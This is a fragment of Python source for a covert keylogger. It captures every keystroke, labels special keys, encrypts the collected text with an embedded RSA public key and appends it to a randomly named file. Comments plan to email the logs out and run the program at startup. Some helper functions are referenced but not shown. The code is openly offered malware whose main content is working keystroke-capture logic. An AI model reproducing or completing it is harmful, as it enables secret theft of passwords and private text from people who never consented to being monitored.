fileName = randomFileName()
chars = 0
data = []

def on_press(key):
    path = randomPath()
    subs = ['Key.enter', ' [ENTER] ', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
            'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ',
            'Key.left', ' [LEFT ARROW] ', 'Key.right', ' [RIGHT ARROW] ', 'Key.shift', ' [SHIFT] ', '\\x13',
            ' [CTRL-S] ', '\\x17', ' [CTRL-W] ', 'Key.caps_lock', ' [CAPS LK] ', '\\x01', ' [CTRL-A] ', 'Key.cmd',
            ' [WINDOWS KEY] ', 'Key.print_screen', ' [PRNT SCR] ', '\\x03', ' [CTRL-C] ', '\\x16', ' [CTRL-V] ']

    keyPressed = "{0}".format(key).replace("'", "")

    if keyPressed in subs:
        data.append(subs[subs.index(keyPressed) + 1])
    else:
        data.append(keyPressed)

    print("".join(data))  # debug statement to see chars
    writeLogs(path)

def writeLogs(path):
    public_key = """-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAseI0Lcsp/XCteq+F5Qqq\n6n6MGcwc9r7FBfnYw9eprIJGvWaanmiRte7JQhMh1STTOG9Eo0/q30hw6vufm2EA\nF1JbLizs4catWSd8INbhG7W8eFBYOuCqRELqviSJLlt4cXABn6UAuVqYbUKUXQk1\nP/B+vJ3TLRE/0IVo1Fp9R2dLPIC0vM5wV6xzhNfpqQfTnCvCVxwkK7ze4j1iVGjv\n/alp4Jfx3FAuGkHlm0abiaKQietf/beIExszjWwckPoWAs8qeuKDANg8l8l1NHyC\ngFnnmmNfDsF/aOVKX/9An3j2un5e8uhwx8VgVrhU8UqVsz0HoxBCOkaoTOqLCbS9\n3wIDAQAB\n-----END PUBLIC KEY-----""".encode()
    ciphertext = encryption(public_key.decode("utf-8"), bytes("".join(data).encode()))
    # print(public_key.decode("utf-8"))
    with open(fileName, "a") as f:
        f.write("".join(str(ciphertext)))
        f.close()

# add a function to send the logs via email
# startup keylogger
# possibly adding a window filter
